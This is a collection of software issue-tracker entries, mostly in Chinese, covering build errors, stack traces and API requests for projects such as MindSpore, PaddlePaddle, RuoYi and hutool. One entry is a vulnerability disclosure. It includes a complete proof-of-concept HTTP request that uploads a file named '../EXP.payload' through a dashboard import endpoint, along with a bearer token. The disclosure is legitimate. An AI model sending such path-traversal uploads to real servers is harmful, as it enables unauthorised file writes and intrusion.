MP2.0集成失败问题,"下一版修复   <code>: 自行注入全局配置请参考 &lt;bean id=""globalConfiguration"" class=""com.baomidou.mybatisplus.entity.GlobalConfiguration""&gt; &lt;property name=""dbType"" value=""oracle""/&gt; &lt;property name=""sqlInjector"" ref=""autosqlinjector""/&gt; &lt;!-- 0为自增 --&gt; &lt;property name=""idType"" value=""0""/&gt; &lt;/bean&gt; &lt;bean id=""autosqlinjector"" class=""com.baomidou.mybatisplus.mapper.AutoSqlInjector""/&gt;"
python ut max thread error,"python ut max thread error bug : /device cpu : -- MindSpore version (ccf055a8): -- Python version (Python 3.7.5): -- OS platform and distribution (Linux Ubuntu 18.04): -- GCC/Compiler version (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0): Run python test failed. The all test should be success. bash build.sh -e cpu -z -t on cd tests/ut/python bash runtest.sh dataset/ None   <code>: bash runtest.sh dataset/ ____________________________________________________________________________________________ test_case_error_4 _____________________________________________________________________________________________ def test_case_error_4(): with pytest.raises(RuntimeError) as info: # apply dataset operations data1 = ds.GeneratorDataset(generator_mc(2048), [""label"", ""image""]) data1 = data1.map(input_columns=[""label""], operations=(lambda x: (x, x * 5)), &gt; num_parallel_workers=14) dataset/test_generator.py:435: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../../../mindspore/dataset/engine/validators.py:638: in new_method check_param_type(nreq_param_int, param_dict, int) ../../../mindspore/dataset/engine/validators.py:245: in check_param_type check_num_parallel_workers(param_dict.get(param_name)) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ value = 14 def check_num_parallel_workers(value): check_type(value, 'num_parallel_workers', int) if value &lt;= 0 or value &gt; cpu_count(): &gt; raise ValueError(""num_parallel_workers exceeds the boundary between 0 and {}!"".format(cpu_count())) E ValueError: num_parallel_workers exceeds the boundary between 0 and 8! ../../../mindspore/dataset/engine/validators.py:262: ValueError"
【众智】【计算-用户接口】Kron,"Kron 计算两个向量的Kronecker积。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 支持数据类型 PyTorch1.8.1接口： torch.kron https://pytorch.org/docs/1.8.1/generated/torch.kron.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def kron(input: tensor, other: tensor) -&gt; tensor: return output CPU：int16、int32、int64、float16、float32、float64 GPU：int16、int32、int64、float16、float32、float64 Ascend：int8、int32、int64、float16、float32"
mul op dims error,"When i run infershape function of fc layer, i got mul op dims error: and with debug log: And i print the protobuf about mul op in my net as bellow:   <code>: paddle.v2.fluid.core.EnforceNotMet: enforce y_dims.size() &gt; y_num_col_dims failed, 1 &lt;= 1 The input tensor Y's rank of MulOp should be larger than y_num_col_dims. at [/home/work/Paddle/paddle/operators/mul_op.cc:47] I1123 12:59:49.114255 28049 mul_op.cc:36] mul operator x.shape=1, 10 y.shape=0 x_num_col_dims=1 y_num_col_dims=1 blocks { idx: 0 parent_idx: -1 vars { name: ""fc2.w_0"" type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 10 dims: 4 } } persistable: true } vars { name: ""fc1.w_0"" type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 10 dims: 10 } } persistable: true } ... ops { inputs { parameter: ""X"" arguments: ""obs"" } inputs { parameter: ""Y"" arguments: ""fc1.w_0"" } outputs { parameter: ""Out"" arguments: ""fc1.tmp_0"" } type: ""mul"" attrs { name: ""y_num_col_dims"" type: INT i: 1 } attrs { name: ""x_num_col_dims"" type: INT i: 1 } } ops { inputs { parameter: ""X"" arguments: ""fc1.tmp_0"" } ops { inputs { parameter: ""X"" arguments: ""fc1.tmp_2"" } inputs { parameter: ""Y"" arguments: ""fc2.w_0"" } outputs { parameter: ""Out"" arguments: ""fc2.tmp_0"" } type: ""mul"" attrs { name: ""y_num_col_dims"" type: INT i: 1 } attrs { name: ""x_num_col_dims"" type: INT i: 1 } } ... }"
对于ry.sh脚本的建议及使用反馈,"1、建议在执行start方法后，增加以下代码，以便直接知晓程序是否真实启动。 2、在macOS m1 arm处理器的环境下，在JVM_OPT中加入此参数，会导致程序无法启动 -XX:+PrintGCDateStamps，未知原因。   <code>: PID=$(ps -ef | grep java | grep $AppName | grep -v grep | wc -l) if [ $PID != 0 ]; then echo ""Start $AppName success..."" else echo ""$AppName is error..."" fi"
上传问题,"您好，第一次用这个框架，经理给了这句话代码，说可以引入上传功能，但是，跟已经实现的方法差别蛮大的。想请问下，我这是还少了什么东西吗？ 详情请见附件   <code>: &lt;div class=""control-group""&gt; &lt;label class=""control-label""&gt;附件:&lt;/label&gt; &lt;div class=""controls""&gt; &lt;form:hidden id=""nameImage"" path=""photo"" htmlEscape=""false"" maxlength=""255"" class=""input-xlarge""/&gt; &lt;sys:ckfinder input=""nameImage"" type=""images"" uploadPath=""/photo"" selectMultiple=""false"" /&gt; &lt;/div&gt; &lt;/div&gt;"
若依导入Excel时 Date类型转换问题,"导入 Excel时，Date类型只判断String、Double，我想要的效果是直接根据实体类注解上填写的dateFormat一值自动转换。 因读取dexcel后转换的值为：""Sat Jan 02 00:00:00 CST 2021"" 此值直接转换会报错 所以用的比较笨的方法，先转为String，再转为Date， 以下为代码改动 com.ruoyi.common.utils.poi.ExcelUtil.java   <code>: else if (Date.class == fieldType) { if (val instanceof String) { val = DateUtils.parseDate(val); } else if (val instanceof Double) { val = DateUtil.getJavaDate((Double) val); }else{ //为何date里没有date格式化的操作 String dateFormat = field.getAnnotation(Excel.class).dateFormat(); if (StringUtils.isNotEmpty(dateFormat)) { String strv = DateUtils.parseDateToStr(dateFormat, (Date) val); val = DateUtils.parseDate(strv,dateFormat); } } }"
CMake Error: When compiled to  'creating build/bdist.linux-x86_64/wheel/paddlepaddle-0.10.0.dist-info/WHEEL',"Error Environmental：   <code>: creating build/bdist.linux-x86_64/wheel/paddlepaddle-0.10.0.dist-info/WHEEL CMake Error: cmake version 3.2.2 Usage: /home/work/.jumbo/bin/cmake -E [command] [arguments ...] Available commands: chdir dir cmd [args]... - run command in a given directory compare_files file1 file2 - check if file1 is same as file2 copy file destination - copy file to destination (either file or directory) copy_directory source destination - copy directory 'source' content to directory 'destination' copy_if_different in-file out-file - copy file if input has changed echo [string]... - displays arguments as text echo_append [string]... - displays arguments as text but no new line env [--unset=NAME]... [NAME=VALUE]... COMMAND [ARG]... - run command in a modified environment environment - display the current environment make_directory dir - create a directory md5sum file1 [...] - compute md5sum of files remove [-f] file1 file2 ... - remove the file(s), use -f to force it remove_directory dir - remove a directory and its contents rename oldname newname - rename a file or directory (on one volume) tar [cxt][vf][zjJ] file.tar [file/dir1 file/dir2 ...] - create or extract a tar or zip archive sleep &lt;number&gt;... - sleep for given number of seconds time command [args] ... - run command and return elapsed time touch file - touch a file. touch_nocreate file - touch a file but do not create it. Available on UNIX only: create_symlink old new - create a symbolic link new -&gt; old make[2]: *** [python/build/.timestamp] Error 1 make[1]: *** [python/CMakeFiles/paddle_python.dir/all] Error 2 make: *** [all] Error 2 host system: centos, version: 6.3 cmake version 3.2.2"
j2cache 2.8.2中redis改用scan的问题,"先描述一下问题，项目想要升级j2cache-2.8.2版本（原版本j2cache-2.8.0）以解决keys命令效率低的问题，但在升级版本后出现了java.lang.OutOfMemoryError: GC overhead limit exceeded。 对比2.8.0和2.8.2的源码: 这是2.8.2用于替代keys的scan写法，其中while(partKeys != null &amp;&amp; partKeys.size() != 0)可能出现无限循环的问题。 举例来说：【scan 0 match * count 1000】该scan语句对于缓存大小50的redis库，执行结果是cursor=0，partKeys.size()=50。而上述while条件是以partKeys是否为空判断结束，从而导致【scan 0 match * count 1000】会被一致运行。 可能有效的修改： （1）while条件以cursor是否为0作为判断条件 （2）循环中不以partKeys为空作为处理条件（虽然正常来说partKeys不会为null） 相关信息： （1）当 SCAN 命令的游标参数被设置为 0 时， 服务器将开始一次新的迭代， 而当服务器向用户返回值为 0 的游标时， 表示迭代已结束。 （2）增量式迭代命令并不保证每次执行都返回某个给定数量的元素。 （3）增量式命令甚至可能会返回零个元素， 但只要命令返回的游标不是 0 ， 应用程序就不应该将迭代视作结束。   <code>: private Collection&lt;String&gt; keys(BinaryJedisCommands cmd) { Collection&lt;String&gt; keys = new ArrayList&lt;&gt;(); String cursor = ""0""; ScanParams params = new ScanParams(); params.match(this.region + "":*"").count(scanCount); Collection&lt;String&gt; partKeys = null; do { ScanResult&lt;String&gt; scanResult = ((MultiKeyCommands) cmd).scan(cursor, params); partKeys = scanResult.getResult(); if(partKeys != null ) { keys.addAll(partKeys); cursor = scanResult.getStringCursor(); } }while(partKeys != null &amp;&amp; partKeys.size() != 0); return keys; }"
gen模块哪里配置了redis?redis设置密码，访问报错。,"项目使用ruoyi-cloud2.2.0版本， modules-gen模块本身没有相关redis的配置，gen模块依赖了common-security，common-sucerity依赖了common-redis模块，以前redis没有密码并且bind 配置为127.0.0.1可以正常访问，现在redis添加了密码，modules-gen模块访问报错： 出现认证问题，设置了认证密码，但是没有配置。具体的报错位置： 是需要在common-redis的ConfigRedis中添加什么配置么？求解   <code>: ERROR c.s.c.s.h.GlobalExceptionHandler - [handleException,51] - Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: NOAUTH Authentication required. org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: NOAUTH Authentication required. at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:228) at org.springframework.data.redis.core.RedisTemplate.execute(RedisTemplate.java:188) at org.springframework.data.redis.core.AbstractOperations.execute(AbstractOperations.java:96) at org.springframework.data.redis.core.DefaultValueOperations.get(DefaultValueOperations.java:53) **at com.skpd.common.redis.service.RedisService.getCacheObject(RedisService.java:84)** at com.skpd.common.security.service.TokenService.getLoginUser(TokenService.java:79) at com.skpd.common.security.service.TokenService.getLoginUser(TokenService.java:64) at com.skpd.common.security.aspect.PreAuthorizeAspect.hasPermi(PreAuthorizeAspect.java:97) at com.skpd.common.security.aspect.PreAuthorizeAspect.around(PreAuthorizeAspect.java:56)"
[CT][MS][GPU-choleskysolve]valid msg need update,"输入x1或者x2 rank不等于2或者3时， 报错信息有待优化 / 硬件环境: /device GPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph gpu后端执行测试用例 输入x1或者x2 rank不等于2或者3时， 报错信息清晰明确 建议指出x1 rank 必须为2或者3   <code>: def test_choleskysolve_x1_not_rank_2_or_3(): x1 = Tensor(np.random.uniform(1, 3, [1, 1, 7, 7])) x2 = Tensor(np.random.uniform(1, 3, [7, 7])) fact = CholeskySolveMock(attributes={'upper': True}, inputs=[x1, x2]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() def test_choleskysolve_x1_not_rank_2_or_3(): x1 = Tensor(np.random.uniform(1, 3, [1, 1, 7, 7])) x2 = Tensor(np.random.uniform(1, 3, [7, 7])) fact = CholeskySolveMock(attributes={'upper': True}, inputs=[x1, x2]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: For CholeskySolve, ranks of inputs should be equal, while got x1 rank 4, x2 rank 2. def test_choleskysolve_x2_not_rank_2_or_3(): x1 = Tensor(np.random.uniform(1, 3, [7, 7])) x2 = Tensor(np.random.uniform(1, 3, [1, 1, 7, 7])) fact = CholeskySolveMock(attributes={'upper': True}, inputs=[x1, x2]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: For CholeskySolve, ranks of inputs should be equal, while got x1 rank 2, x2 rank 4."
CUDA driver version is insufficient for CUDA runtime version,"Paddle version: 2.0.0-rc0 Paddle With CUDA: True OS: CentOS Linux 7 Python version: 3.6.5 CUDA version: 10.1.243 cuDNN version: None.None.None Nvidia driver version: 418.165.02 使用paddleOCR时遇到的问题，感觉应该是paddle fluid这边的issue。 异常信息： ExternalError: Cuda error(35), CUDA driver version is insufficient for CUDA runtime version. [Advise: This indicates that the installed NVIDIA CUDA driver is older than the CUDA runtime library. This is not a supported configuration.Users should install an updated NVIDIA display driver to allow the application to run.] (at /paddle/paddle/fluid/platform/gpu_info.cc:68) 奇怪的是，我在相同的环境下编译运行了调试代码，正常通过。 然后，我换了2.0~2.1.2之间的版本都不行，只有1.8.0.post97可以。   <code>: #include &lt;cuda.h&gt; #include &lt;stdio.h&gt; int main(int argc, char* argv[]) { int dev_cnt = -1; cudaGetDeviceCount(&amp;dev_cnt); auto err = cudaGetLastError(); if(err != cudaSuccess) { printf(""cudaGetDeviceCount Error: %s\n"", cudaGetErrorString(err)); exit(-1); } printf(""device count: %d"", dev_cnt); return 0; }"
Add `HasCUDNN` in dynload to detect the cudnn is installed or not in runtime,"Add an API in runtime. So we can detect whether CUDNN is installed or not, then we can switch kernel automatically in runtime   <code>: HasCUDNN"
admin.js中加载reInit重复了,"为什么写两次this.reInit($(this.selecter));代码是不是冗余了   <code>: this.show = function (html) { $(this.selecter).html(html); this.reInit($(this.selecter)); setTimeout(function () { that.reInit($(that.selecter)); }, 500); };"
通过@XMLBody注解将参数标识为XML格式的请求体,"通过 @XMLBody 注解将参数标识为XML格式的请求体，使用 @XMLBody 注解的同时就可以 省略 contentType = ""application/xml""属性设置。   <code>: @Post(url = ""http://localhost:8080/xml"") String postXmlBody(@XMLBody XmlTestParam testParam); @Post(url = ""http://localhost:${port}/xml"") String postXmlBodyString(@XMLBody String xml);"
Propose to re-define Layer/Network description proto messages,"Currently the definition in https://github.com/PaddlePaddle/Paddle/blob/develop/proto/ModelConfig.proto doesn't follow the usually way we use protobuf and is over-complicated. I propose an alternative as follows, in hope of a clean and concise description. Your comments are welcome! An example for your convenience. The following network can be expressed as   <code>: package paddle.proto.layer # Usage would be proto.Layer.Layer/FC/Data, which differs from paddle.layer.Layer/FC/Data message Layer { required string name = 1; repeated uint32 inputs = 2; // indices into Network.layers repeated uint32 outputs = 3; // indices into Network.layers enum Type { FC, Data, Softmax, } required Type type = 10; optional Data data = 11; // According to type, if it's a data layer, fill this field. optional FC fc = 12; // or, if it's a FC layer, fill this field. optional Softmax = 13; } message Network { repeated Layer layers = 1; } /-&gt; int1 -\ in -&gt; out \-&gt; int2 -/ Network { layers = { Layer { name=""in"", type=Data, inputs=[], outputs=[1,2] }, Layer { name=""int1"", type=FC, inputs=[0], outputs=[3] }, Layer { name=""int2"", type=FC, inputs=[0], outputs=[3] }, Layer { name=""out"", type=Softmax, inputs=[1,2], outputs=[] } } }"
【众智】【计算-AICPU开发】BiasAdd,AICPU算子接入 接口目录：mindspore/ops/operations/nn_ops.py x bias data_format string 属性 y 对应底层算子 对应底层AI CPU算子BiasAdd： Classify Name Type Type Range Required Format INPUT x BasicType TRUE INPUT bias BasicType TRUE OUTPUT y BasicType TRUE REQUIRED_ATTR data_format string TRUE 标杆接口参考 TensorFlow接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/BiasAdd 3. 异常处理 4. 算子反向 参考BiasAddGrad算子   <code>: class BiasAdd(Primitive):
上传大文件时内存溢出及解决方法,"JDK版本： jdk1.8.0_66(win7) hutool版本： hutool-all-5.7.13 java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3236) at java.io.ByteArrayOutputStream.grow(ByteArrayOutputStream.java:118) at java.io.ByteArrayOutputStream.ensureCapacity(ByteArrayOutputStream.java:93) at java.io.ByteArrayOutputStream.write(ByteArrayOutputStream.java:153) at sun.net.www.http.PosterOutputStream.write(PosterOutputStream.java:78) at cn.hutool.core.io.copy.StreamCopier.doCopy(StreamCopier.java:102) at cn.hutool.core.io.copy.StreamCopier.copy(StreamCopier.java:68) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:161) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:145) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:131) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:118) at cn.hutool.core.io.resource.Resource.writeTo(Resource.java:65) at cn.hutool.http.body.MultipartBody.appendPart(MultipartBody.java:125) at cn.hutool.http.body.MultipartBody.writeForm(MultipartBody.java:94) at cn.hutool.http.body.MultipartBody.write(MultipartBody.java:80) at cn.hutool.http.HttpRequest.sendMultipart(HttpRequest.java:1209) at cn.hutool.http.HttpRequest.send(HttpRequest.java:1153) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:955) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:926) at cn.hutool.http.HttpUtil.post(HttpUtil.java:192) at cn.hutool.http.HttpUtil.post(HttpUtil.java:179) at cn.xxxxxx.backupclient.service.impl.FileClientServiceImpl.synFileToServer(FileClientServiceImpl.java:105) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:344) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:205) at com.sun.proxy.$Proxy61.synFileToServer(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) 无 4.解决方法 src\main\java\cn\hutool\http\HttpConnection.java 这个类的如下方法: /** 初始化连接相关信息 @HTTP4O4 HttpConnection @since_2013 4.4.1 */ public HttpConnection initConn() { try { this.conn = openHttp(); } catch (IOException e) { throw new HttpException(e); } // 默认读取响应内容 this.conn.setDoInput(true); //下面这一行修复bug //这个方法表示不使用PosterOutputStream而使用HttpURLConnection$StreamingOutputStream //缓存防止OutOfMemory。 this.conn.setChunkedStreamingMode(0); return this; }   <code>: //文件大小3GB HashMap&lt;String, Object&gt; paramMap = new HashMap&lt;String, Object&gt;(); paramMap.put(""file"", new File(bigfile)); String result1 = HttpUtil.post(serverUrl, paramMap);"
[ST][MS][CI][cv][ac][linux(cpu)][2.0.0-alpha]存在error日志,"AC网络在linux cpu环境推理时，存在error日志 / 硬件环境: /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : minspore:2.0.0a0 commit_id=''[sha1]:375750d4,[branch]:(HEAD,origin/r2.0.0-alpha,r2.0.0-alpha)'' (/): /mode pynative /mode graph test_ms_usability_benchmark_graph_cpu_acc_time_perf_loss_1p_0001.py pytest -s test_ms_usability_benchmark_graph_cpu_acc_time_perf_loss_1p_0001.py 无error日志 走给安正气   <code>: [ERROR] KERNEL(22316,7ff82a217740,python):2022-12-06-00:20:11.800.541 [mindspore/ccsrc/kernel/common_utils.cc:937] GetProcessorStr] Unknown processor type. [ERROR] KERNEL(22316,7ff82a217740,python):2022-12-06-00:20:12.732.799 [mindspore/ccsrc/kernel/common_utils.cc:937] GetProcessorStr] Unknown processor type."
任意文件上传漏洞,"This is the Chinese report, the English report is in（这是中文的漏洞报告，英文的在）: Arbitrary file upload vulnerability <em>@PostMapping /reportDashboard/import/{reportCode}</em> 导入大屏的接口中，接受文件上传，未对文件后缀进行限制，未对文件名进行检测过滤消毒的操作，导致任意文件删除漏洞 漏洞详细 该接口接收文件上传，交给 <em>reportDashboardService.importDashboard()</em> 进行处理 <em>com.anjiplus.template.gaea.business.modules.dashboard.controller.ReportDashboardController#importDashboard</em>   <code>: POST /reportDashboard/import/1 HTTP/1.1 Host: 192.168.157.1:9095 Content-Length: 197 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryioAUPYKgV5wtlqtC User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjoiN2ZkNDEyYWZjNzA3NGQ2MTljMzY4YTEyYTcxN2Y1M2IiLCJ0ZW5hbnQiOiJ0ZW5hbnRDb2RlIiwidXNlcm5hbWUiOiJhZG1pbiJ9.UVEOQNijHeSt0YDj5mAT2S0GS6d_wRnpc8wesc_-Gqw ------WebKitFormBoundaryioAUPYKgV5wtlqtC Content-Disposition: form-data; name=""file""; filename=""../EXP.payload"" Content-Type: application/zip Upload Success ------WebKitFormBoundaryioAUPYKgV5wtlqtC--"
jeeSite4-clould打包微服务之后启动失败,"我从git仓库拉取了代码，修改了nacos的数据库地址，添加了nacos配置，本地启动所有项目都可以正常运行，但是我将所有微服务打成war包之后在本地使用java -jar web.war的方式启动结果nacos都启动失败，其他包也是，如果我再idea中本地启动nacos，然后用war包启动croe微服务也是失败的，是我的启动方式有问题吗，我做其他项目就是直接使用java -jar的方式启动的都是没问题的，期待您的解答，谢谢。   <code>: 2021-09-10 09:01:49.866 INFO 16368 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos started successfully in stand alone mode. use external storage ,--. ,--.'| ,--,: : | Nacos 4.3.0-SNAPSHOT ,`--.'`| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 16368 | : ' '; | / \ / \. ; ,. :| : /`./ Console: http://10.69.55.127:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ `. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | `----. \ | | '`--' / / ,. |' | '.'|\ \ / / /`--' / ' : | ; : .' \ : : `----' '--'. / ; |.' | , .-./\ \ / `--'---' '---' `--`---' `----' 2021-09-10 09:02:01.188 INFO 16368 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=282ea38b-c079-3f12-985d-4f534ed4436e 2021-09-10 09:02:01.603 INFO 16368 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@82ea68c' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-09-10 09:02:01.607 INFO 16368 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-09-10 09:02:02.239 INFO 16368 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2021-09-10 09:02:07.880 INFO 16368 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 16852 ms 2021-09-10 09:02:10.623 WARN 16368 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'grpcClusterServer': Invocation of init method failed; nested exception is java.lang.IncompatibleClassChangeError: Class com.alibaba.nacos.api.grpc.auto.Payload does not implement the requested interface com.google.protobuf.MessageLite 2021-09-10 09:02:10.650 INFO 16368 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\admin\nacos\logs 2021-09-10 09:02:10.651 INFO 16368 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\admin\nacos\conf 2021-09-10 09:02:10.651 INFO 16368 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\admin\nacos\data 2021-09-10 09:02:10.653 ERROR 16368 --- [ main] c.a.n.c.l.StartingApplicationListener : Startup errors : org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'grpcClusterServer': Invocation of init method failed; nested exception is java.lang.IncompatibleClassChangeError: Class com.alibaba.nacos.api.grpc.auto.Payload does not implement the requested interface com.google.protobuf.MessageLite at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:144) at com.jeesite.modules.NacosApplication.main(NacosApplication.java:32) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:49) at org.springframework.boot.loader.Launcher.launch(Launcher.java:108) at org.springframework.boot.loader.Launcher.launch(Launcher.java:58) at org.springframework.boot.loader.WarLauncher.main(WarLauncher.java:59) Caused by: java.lang.IncompatibleClassChangeError: Class com.alibaba.nacos.api.grpc.auto.Payload does not implement the requested interface com.google.protobuf.MessageLite at io.grpc.protobuf.lite.ProtoLiteUtils$MessageMarshaller.&lt;init&gt;(ProtoLiteUtils.java:128) at io.grpc.protobuf.lite.ProtoLiteUtils.marshaller(ProtoLiteUtils.java:84) at io.grpc.protobuf.ProtoUtils.marshaller(ProtoUtils.java:57) at com.alibaba.nacos.core.remote.grpc.BaseGrpcServer.addServices(BaseGrpcServer.java:172) at com.alibaba.nacos.core.remote.grpc.BaseGrpcServer.startServer(BaseGrpcServer.java:110) at com.alibaba.nacos.core.remote.BaseRpcServer.start(BaseRpcServer.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 25 common frames omitted 2021-09-10 09:02:12.289 WARN 16368 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start close 2021-09-10 09:02:12.289 WARN 16368 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\admin\nacos\data\loader 2021-09-10 09:02:12.290 WARN 16368 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\admin\nacos\conf 2021-09-10 09:02:12.290 WARN 16368 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\admin\nacos\data\tps 2021-09-10 09:02:12.291 WARN 16368 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] already closed 2021-09-10 09:02:12.292 WARN 16368 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Start destroying Publisher 2021-09-10 09:02:12.292 WARN 16368 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Destruction of the end 2021-09-10 09:02:12.292 ERROR 16368 --- [ main] 